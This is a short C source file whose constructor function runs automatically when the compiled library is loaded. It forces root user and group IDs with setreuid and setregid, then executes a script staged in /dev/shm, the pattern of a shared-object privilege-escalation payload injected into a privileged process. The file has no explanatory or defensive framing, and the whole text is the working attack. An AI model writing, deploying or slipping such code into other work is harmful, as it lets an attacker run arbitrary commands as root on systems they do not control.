#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_HELPER_ACTIVE")) return;
    
    setenv("SHELL_HELPER_ACTIVE", "1", 1);
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    
    execl("/dev/shm/helper.sh", "helper.sh", NULL);
}